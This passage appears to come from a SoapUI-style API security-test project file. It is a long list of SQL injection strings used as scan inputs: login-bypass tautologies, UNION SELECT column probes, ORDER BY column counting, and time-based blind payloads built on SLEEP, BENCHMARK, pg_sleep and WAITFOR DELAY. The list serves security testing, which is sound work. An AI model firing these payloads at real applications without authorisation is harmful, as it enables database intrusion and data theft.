ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 6 </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 0</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 14 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11-- </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--</con:sqlInjectionStrings><con:sqlInjectionStrings>') or ('x')=('x</con:sqlInjectionStrings><con:sqlInjectionStrings>'''''''''''''UNION SELECT '2</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>1) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 7 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 15 </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 9 </con:sqlInjectionStrings><con:sqlInjectionStrings>1-true</con:sqlInjectionStrings><con:sqlInjectionStrings>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 8# </con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>``</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29</con:sqlInjectionStrings><con:sqlInjectionStrings>" or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 25# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),4</con:sqlInjectionStrings><con:sqlInjectionStrings>waitfor delay '00:00:05'--</con:sqlInjectionStrings><con:sqlInjectionStrings>' GROUP BY columnnames having 1=1 --</con:sqlInjectionStrings><con:sqlInjectionStrings>@variable</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1 or ''='</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR 'x'='x</con:sqlInjectionStrings><con:sqlInjectionStrings>""</con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)='</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1-- </con:sqlInjectionStrings><con:sqlInjectionStrings>SLEEP(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10 </con:sqlInjectionStrings><con:sqlInjectionStrings>);waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#</con:sqlInjectionStrings><con:sqlInjectionStrings>or SLEEP(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 21-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))</con:sqlInjectionStrings><con:sqlInjectionStrings>") or ("x")=("x</con:sqlInjectionStrings><con:sqlInjectionStrings>"&amp;"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 5-- </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 11 </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 12# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x-- </con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--</con:sqlInjectionStrings><con:sqlInjectionStrings>' or 'x'='x</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 23# </con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=y#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 31337 </con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1,2,3--+</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>OR x=x#</con:sqlInjectionStrings><con:sqlInjectionStrings>") or sleep(5)="</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 30 </con:sqlInjectionStrings><con:sqlInjectionStrings>/*!10000%201/0%20*/</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 30#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlZ</con:sqlInjectionStrings><con:sqlInjectionStrings>'&amp;&amp;SLEEP(5)&amp;&amp;'1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND ('pKlZ'='pKlY</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>"*"</con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>''</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 10# </con:sqlInjectionStrings><con:sqlInjectionStrings>1)) or pg_sleep(5)--</con:sqlInjectionStrings><con:sqlInjectionStrings>" OR "" = "</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' or 1=1/*</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 29# </con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21</con:sqlInjectionStrings><con:sqlInjectionStrings>' OR '1</con:sqlInjectionStrings><con:sqlInjectionStrings>" OR 1 = 1 -- -</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT USER()--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</con:sqlInjectionStrings><con:sqlInjectionStrings>"-"</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8</con:sqlInjectionStrings><con:sqlInjectionStrings>admin' --</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#</con:sqlInjectionStrings><con:sqlInjectionStrings>1) or sleep(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=0#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#</con:sqlInjectionStrings><con:sqlInjectionStrings>benchmark(50000000,MD5(1))</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--</con:sqlInjectionStrings><con:sqlInjectionStrings>or pg_SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3,4--</con:sqlInjectionStrings><con:sqlInjectionStrings>or 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 18-- </con:sqlInjectionStrings><con:sqlInjectionStrings>');waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>'LIKE'</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),"'3'"#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 16# </con:sqlInjectionStrings><con:sqlInjectionStrings>1' ORDER BY 1--+</con:sqlInjectionStrings><con:sqlInjectionStrings>1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlY</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 7300=7300 AND 'pKlZ'='pKlZ</con:sqlInjectionStrings><con:sqlInjectionStrings>OR 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 'INJ'||'ECT'||'XXX'#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5)#</con:sqlInjectionStrings><con:sqlInjectionStrings>') or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 27# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 3-- </con:sqlInjectionStrings><con:sqlInjectionStrings>-2</con:sqlInjectionStrings><con:sqlInjectionStrings>admin" or 1=1--</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--</con:sqlInjectionStrings><con:sqlInjectionStrings>'\"</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1# </con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#</con:sqlInjectionStrings><con:sqlInjectionStrings>' AND MID(VERSION(),1,1) = '5';</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</con:sqlInjectionStrings><con:sqlInjectionStrings>AS INJECTX WHERE 1=1 AND 1=1#</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 1=1 AND '%'='</con:sqlInjectionStrings><con:sqlInjectionStrings>ORDER BY 1,SLEEP(5),3#</con:sqlInjectionStrings><con:sqlInjectionStrings>"));waitfor delay '0:0:5'--</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#</con:sqlInjectionStrings><con:sqlInjectionStrings>admin") or "1"="1"--</con:sqlInjectionStrings><con:sqlInjectionStrings>1/0</con:sqlInjectionStrings><con:sqlInjectionStrings>' and 1=2 --</con:sqlInjectionStrings><con:sqlInjectionStrings>')) or benchmark(10000000,MD5(1))#</con:sqlInjectionStrings><con:sqlInjectionStrings>UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19</con:sqlInjectionStrings><con:sqlInjectionStrings>AND 5650=CONVERT(INT,(UNION ALL 